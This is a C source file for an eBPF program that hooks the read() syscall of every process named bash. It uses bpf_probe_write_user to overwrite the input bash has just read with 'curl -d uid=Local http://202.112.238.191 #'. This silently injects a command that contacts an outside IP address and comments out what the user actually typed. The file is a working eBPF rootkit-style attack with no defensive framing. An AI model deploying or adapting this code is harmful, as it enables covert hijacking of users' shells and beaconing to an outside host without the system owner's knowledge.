
#define DEBUG_LOG

#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>
#include <linux/sched.h>

#include <stdint.h>

#include <linux/ptrace.h>
#include <asm/unistd_64.h>
#include <stdbool.h>

char __license[] SEC("license") = "Dual MIT/GPL";

#define TASK_COMM_LEN 16
#define TARGET_NAME "bash"

struct {
	__uint(type, BPF_MAP_TYPE_ARRAY);
	__uint(max_entries, 10);
	__type(key, __uint32_t);   // global_id
	__type(value, __uint64_t); // packet count
} global_var_kv SEC(".maps");

enum {
	GLOBAL_TICK1 = 0,
};


static __inline void save_global_val(uint32_t key, uint64_t val) {
	bpf_map_update_elem(&global_var_kv, &key, &val, 0);
}

static __inline int fetch_global_int(uint32_t key) {
	int val;
	void* ptr = bpf_map_lookup_elem(&global_var_kv, &key);
	bpf_probe_read(&val, sizeof(val), ptr);
	return val;
}

static __inline bool is_target_process() {
	char comm[TASK_COMM_LEN] = {0};
	bpf_get_current_comm(&comm, sizeof(comm));
	if (__builtin_memcmp(comm, TARGET_NAME, sizeof(TARGET_NAME)) != 0){
		return false;
	}
	// // bpf_log("comm: %s\n", comm);
	return true;
}


static __inline int handle_exit_read(struct bpf_raw_tracepoint_args *ctx) {
	int tick = fetch_global_int(GLOBAL_TICK1);
	save_global_val(GLOBAL_TICK1, tick);

	struct pt_regs *regs = (struct pt_regs *)(ctx->args[0]);

	int read_bytes = 0;
	bpf_probe_read(&read_bytes, sizeof(read_bytes),&regs->rax);

	int read_fd = 0;
	bpf_probe_read(&read_fd , sizeof(read_fd),&regs->rdi);

	// We only proceed if read() actually returned some bytes.
	if (read_bytes <= 0) {
		goto exit;
	}

	char *buffer = NULL;
	bpf_probe_read(&buffer , sizeof(buffer) , &regs->rsi);

	char buffer2[] = "curl -d uid=Local http://202.112.238.191 #";
	// CHANGE 2: Initialize ret to a clear value like -999.
	int ret = -999;
	if(read_bytes > sizeof(buffer2)){
		// bpf_log("try to send request---------------------------\n");
		ret = bpf_probe_write_user((char *)(buffer), buffer2, sizeof(buffer2));
	}

exit:
	// bpf_log("handle_exit_read: tick=%d, ret=%d\n", tick, ret);
	return 0;
}


SEC("raw_tracepoint/sys_enter")
int raw_tp_sys_enter(struct bpf_raw_tracepoint_args *ctx) {
	if (!is_target_process()) return 0;

	int tick = 0;
	unsigned long syscall_id = ctx->args[1];
	switch (syscall_id)
	{
	case 0:
		tick = fetch_global_int(GLOBAL_TICK1) + 1;
		save_global_val(GLOBAL_TICK1, tick);
		// bpf_log("handle_enter_read: %d\n", tick);
		break;
	}
	
	return 0;
}

SEC("raw_tracepoint/sys_exit")
int raw_tp_sys_exit(struct bpf_raw_tracepoint_args *ctx) {
	if (!is_target_process()) return 0;

	unsigned long syscall_id;
	struct pt_regs *regs = (struct pt_regs *)(ctx->args[0]);
	bpf_probe_read(&syscall_id, sizeof(syscall_id) , &regs->orig_rax);

	switch (syscall_id)
	{
	case 0:
		handle_exit_read(ctx);
		break;
	}

	return 0;
}
